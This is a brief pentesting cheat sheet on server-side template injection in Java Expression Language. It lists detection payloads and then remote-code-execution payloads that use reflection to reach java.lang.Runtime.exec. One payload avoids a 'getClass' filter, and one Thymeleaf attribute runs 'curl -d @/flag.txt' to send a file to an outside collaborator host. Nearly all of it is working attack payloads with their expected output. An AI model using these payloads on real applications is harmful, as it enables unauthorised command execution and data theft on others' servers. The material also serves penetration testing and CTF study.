**Server-Side Template Injection**


payloads start with * # or $
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md


# Detection 
```
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```




# RCE
```
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```

